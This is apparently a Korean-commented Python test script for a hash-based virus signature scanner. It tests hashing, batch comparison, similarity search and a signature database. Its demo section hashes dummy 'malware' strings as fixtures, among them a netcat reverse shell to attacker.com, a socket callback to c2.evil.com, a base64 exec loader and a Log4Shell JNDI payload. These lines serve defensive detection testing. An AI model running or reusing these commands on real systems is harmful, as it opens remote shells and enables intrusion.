"""
Detective Core 테스트 스크립트 - 더미값 기반 기능 검증 + 실사용 데모

═══════════════════════════════════════════════
실행 방법:
    cd c:\\Users\\axzsw\\pro\\detective-h\\cli
    python test_detective_core.py

사전 필요: detective_core.dll 빌드
    cd c:\\Users\\axzsw\\pro\\detective-h\\core\\blake_hash\\build
    cmake .. -G "Ninja" -DCMAKE_C_COMPILER=clang
    cmake --build .
═══════════════════════════════════════════════
"""

import sys
import time


def print_header(title: str):
    """테스트 섹션 헤더 출력"""
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def print_result(name: str, passed: bool, detail: str = ""):
    """테스트 결과 출력"""
    status = "✅ PASS" if passed else "❌ FAIL"
    msg = f"  {status}  {name}"
    if detail:
        msg += f" → {detail}"
    print(msg)


def run_tests():
    """모든 테스트 실행"""
    from virus_tracker.detective_core_wrapper import (
        hash_string, hash_bytes, compare_hashes,
        batch_hash, batch_compare, similarity_search,
        DetectiveCore, VirusSignatureDB
    )

    passed = 0
    failed = 0

    # ─────────────────────────────────────────
    # 1. 단일 해시 테스트
    # ─────────────────────────────────────────
    print_header("1. 단일 해시 생성 테스트")

    # 테스트 1-1: 문자열 해시 생성
    try:
        h = hash_string("hello world")
        ok = len(h) == 64 and all(c in '0123456789abcdef' for c in h)
        print_result("hash_string('hello world')", ok, f"len={len(h)}, hash={h[:16]}...")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("hash_string('hello world')", False, str(e))
        failed += 1

    # 테스트 1-2: 동일 입력 → 동일 해시 (일관성)
    try:
        h1 = hash_string("test_consistency")
        h2 = hash_string("test_consistency")
        ok = h1 == h2
        print_result("동일 입력 → 동일 해시", ok, f"{h1[:16]}... == {h2[:16]}...")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("동일 입력 → 동일 해시", False, str(e))
        failed += 1

    # 테스트 1-3: 다른 입력 → 다른 해시
    try:
        h1 = hash_string("input_A")
        h2 = hash_string("input_B")
        ok = h1 != h2
        print_result("다른 입력 → 다른 해시", ok, f"{h1[:16]}... vs {h2[:16]}...")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("다른 입력 → 다른 해시", False, str(e))
        failed += 1

    # 테스트 1-4: 바이트 해시
    try:
        h = hash_bytes(b"binary data test")
        ok = len(h) == 32
        print_result("hash_bytes(b'binary data test')", ok, f"len={len(h)}, hex={h.hex()[:16]}...")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("hash_bytes(b'binary data test')", False, str(e))
        failed += 1

    # 테스트 1-5: 빈 문자열 해시
    try:
        h = hash_string("")
        ok = len(h) == 64
        print_result("hash_string('') (빈 문자열)", ok, f"hash={h[:16]}...")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("hash_string('') (빈 문자열)", False, str(e))
        failed += 1

    # ─────────────────────────────────────────
    # 2. 해시 비교 테스트
    # ─────────────────────────────────────────
    print_header("2. 해시 비교 테스트")

    # 테스트 2-1: 같은 해시 비교
    try:
        h1 = hash_string("same_data")
        h2 = hash_string("same_data")
        ok = compare_hashes(h1, h2) == True
        print_result("같은 해시 비교 → True", ok)
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("같은 해시 비교 → True", False, str(e))
        failed += 1

    # 테스트 2-2: 다른 해시 비교
    try:
        h1 = hash_string("data_A")
        h2 = hash_string("data_B")
        ok = compare_hashes(h1, h2) == False
        print_result("다른 해시 비교 → False", ok)
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("다른 해시 비교 → False", False, str(e))
        failed += 1

    # ─────────────────────────────────────────
    # 3. 배치 해시 테스트
    # ─────────────────────────────────────────
    print_header("3. 배치 해시 테스트 (Python List → C)")

    # 테스트 3-1: 소규모 배치
    try:
        inputs = ["code_snippet_1", "code_snippet_2", "code_snippet_3"]
        hashes = batch_hash(inputs)
        ok = len(hashes) == 3 and all(len(h) == 64 for h in hashes)
        print_result(f"배치 해시 ({len(inputs)}개)", ok, f"[{hashes[0][:12]}..., ...]")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("배치 해시 (3개)", False, str(e))
        failed += 1

    # 테스트 3-2: 대용량 배치 (100개)
    try:
        inputs = [f"virus_sample_{i}" for i in range(100)]
        start = time.perf_counter()
        hashes = batch_hash(inputs)
        elapsed = time.perf_counter() - start
        ok = len(hashes) == 100
        print_result(f"대용량 배치 해시 (100개)", ok, f"{elapsed*1000:.1f}ms")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("대용량 배치 해시 (100개)", False, str(e))
        failed += 1

    # 테스트 3-3: 배치 해시 일관성 (개별 해시와 동일한지)
    try:
        inputs = ["test_A", "test_B", "test_C"]
        batch_results = batch_hash(inputs)
        individual_results = [hash_string(s) for s in inputs]
        ok = batch_results == individual_results
        print_result("배치 해시 == 개별 해시 (일관성)", ok)
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("배치 해시 == 개별 해시 (일관성)", False, str(e))
        failed += 1

    # ─────────────────────────────────────────
    # 4. 배치 비교 테스트 (DB 매칭)
    # ─────────────────────────────────────────
    print_header("4. 배치 비교 테스트 (바이러스 DB 매칭)")

    # 테스트 4-1: 일치하는 해시 찾기
    try:
        target = hash_string("virus_code_X")
        db = [
            hash_string("safe_code_A"),
            hash_string("virus_code_X"),  # index 1 일치
            hash_string("safe_code_B"),
            hash_string("virus_code_X"),  # index 3 일치
            hash_string("safe_code_C"),
        ]
        matches = batch_compare(target, db)
        ok = matches == [1, 3]
        print_result("DB 매칭 (2개 일치)", ok, f"matches={matches}")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("DB 매칭 (2개 일치)", False, str(e))
        failed += 1

    # 테스트 4-2: 일치 없음
    try:
        target = hash_string("unknown_code")
        db = [hash_string("virus_A"), hash_string("virus_B")]
        matches = batch_compare(target, db)
        ok = matches == []
        print_result("DB 매칭 (일치 없음)", ok, f"matches={matches}")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("DB 매칭 (일치 없음)", False, str(e))
        failed += 1

    # ─────────────────────────────────────────
    # 5. 유사도 검색 테스트
    # ─────────────────────────────────────────
    print_header("5. 유사도 검색 테스트 (변종 탐지)")

    # 테스트 5-1: 완전 동일한 해시 → 유사도 1.0
    try:
        target = hash_bytes(b"virus_sample_data")
        db = [hash_bytes(b"virus_sample_data")]
        results = similarity_search(target, db, threshold=0.5)
        ok = len(results) == 1 and results[0][1] == 1.0
        detail = f"similarity={results[0][1]:.1%}" if results else "no results"
        print_result("완전 동일 → 유사도 1.0", ok, detail)
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("완전 동일 → 유사도 1.0", False, str(e))
        failed += 1

    # 테스트 5-2: 완전 다른 해시 → 낮은 유사도
    try:
        target = hash_bytes(b"completely_different_A")
        db = [hash_bytes(b"completely_different_B")]
        results = similarity_search(target, db, threshold=0.99)
        ok = len(results) == 0  # 99% 이상 유사한 항목 없어야 함
        print_result("다른 해시 → 낮은 유사도 (임계값 0.99)", ok, f"results={len(results)}")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("다른 해시 → 낮은 유사도", False, str(e))
        failed += 1

    # ─────────────────────────────────────────
    # 6. 클래스형 API 테스트
    # ─────────────────────────────────────────
    print_header("6. 클래스형 API 테스트 (DetectiveCore)")

    try:
        core = DetectiveCore()

        # 해시
        h = core.hash("class_api_test")
        ok1 = len(h) == 64

        # 비교
        ok2 = core.compare(h, h) == True
        ok3 = core.compare(h, core.hash("other")) == False

        # 배치 해시
        hashes = core.batch_hash(["a", "b", "c"])
        ok4 = len(hashes) == 3

        ok = ok1 and ok2 and ok3 and ok4
        print_result("DetectiveCore 전체 기능", ok,
                     f"hash={ok1}, compare={ok2}/{ok3}, batch={ok4}")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("DetectiveCore 전체 기능", False, str(e))
        failed += 1

    # ─────────────────────────────────────────
    # 7. VirusSignatureDB 테스트
    # ─────────────────────────────────────────
    print_header("7. VirusSignatureDB 테스트")

    try:
        core = DetectiveCore()

        # DB 구성 (더미 바이러스 해시)
        virus_hashes = [
            core.hash("malware_ransomware_v1"),
            core.hash("trojan_backdoor_v2"),
            core.hash("worm_email_v3"),
        ]
        db = VirusSignatureDB(virus_hashes)
        ok1 = db.count == 3

        # 추가
        db.add(core.hash("spyware_keylogger_v4"))
        ok2 = db.count == 4

        # 검색 (일치)
        target = core.hash("trojan_backdoor_v2")
        matches = db.search(target)
        ok3 = 1 in matches

        # 검색 (불일치)
        safe_hash = core.hash("safe_program")
        no_match = db.search(safe_hash)
        ok4 = len(no_match) == 0

        ok = ok1 and ok2 and ok3 and ok4
        print_result("VirusSignatureDB 전체 기능", ok,
                     f"init={ok1}, add={ok2}, search={ok3}, no_match={ok4}")
        passed += 1 if ok else 0
        failed += 0 if ok else 1
    except Exception as e:
        print_result("VirusSignatureDB 전체 기능", False, str(e))
        failed += 1

    # ─────────────────────────────────────────
    # 실사용 데모: 바이러스 스캔 시뮬레이션
    # ─────────────────────────────────────────
    print_header("DEMO: 바이러스 스캔 시뮬레이션")

    try:
        core = DetectiveCore()

        # 1) 알려진 바이러스 시그니처 DB 구성
        known_viruses = {
            "WannaCry_Ransomware": "import socket; s=socket.socket(); s.connect(('c2.evil.com',4444))",
            "Emotet_Trojan": "exec(base64.b64decode('bWFsd2FyZV9wYXlsb2Fk'))",
            "Mirai_Botnet": "telnetlib.Telnet(target, 23); tn.write(b'admin\\n')",
            "Log4Shell_Exploit": "${jndi:ldap://evil.com/exploit}",
            "CobalStrike_Beacon": "shellcode = b'\\xfc\\xe8\\x89\\x00\\x00\\x00'",
        }

        virus_hashes = []
        for name, code in known_viruses.items():
            h = core.hash(code)
            virus_hashes.append(h)
            print(f"  📋 {name}: {h[:24]}...")

        db = VirusSignatureDB(virus_hashes)
        print(f"\n  📁 DB 구성 완료: {db.count}개 바이러스 시그니처\n")

        # 2) 의심 파일들 스캔
        suspicious_files = [
            ("safe_script.py", "print('Hello, World!')"),
            ("malicious_loader.py", "exec(base64.b64decode('bWFsd2FyZV9wYXlsb2Fk'))"),
            ("backdoor.sh", "nc -e /bin/bash attacker.com 4444"),
            ("exploit.java", "${jndi:ldap://evil.com/exploit}"),
            ("clean_app.js", "console.log('Clean application');"),
        ]

        print("  🔍 스캔 결과:")
        for filename, content in suspicious_files:
            target = core.hash(content)
            matches = db.search(target)

            if matches:
                virus_names = [list(known_viruses.keys())[i] for i in matches]
                print(f"  🚨 {filename}: 바이러스 발견! → {', '.join(virus_names)}")
            else:
                print(f"  ✅ {filename}: 안전")

        print_result("바이러스 스캔 시뮬레이션", True, "완료")
        passed += 1
    except Exception as e:
        print_result("바이러스 스캔 시뮬레이션", False, str(e))
        failed += 1

    # ─────────────────────────────────────────
    # 최종 결과
    # ─────────────────────────────────────────
    print_header("테스트 결과 요약")
    total = passed + failed
    print(f"  총 {total}개 테스트 중 {passed}개 통과, {failed}개 실패")
    if failed == 0:
        print("  🎉 모든 테스트를 통과했습니다!")
    else:
        print("  ⚠️  일부 테스트가 실패했습니다.")
    print()

    return 0 if failed == 0 else 1


if __name__ == "__main__":
    try:
        sys.exit(run_tests())
    except ImportError as e:
        print(f"❌ 모듈 로드 실패: {e}")
        print("detective_core 라이브러리를 먼저 빌드하세요:")
        print("  cd core/blake_hash/build")
        print("  cmake .. -G \"Ninja\" -DCMAKE_C_COMPILER=clang")
        print("  cmake --build .")
        sys.exit(1)
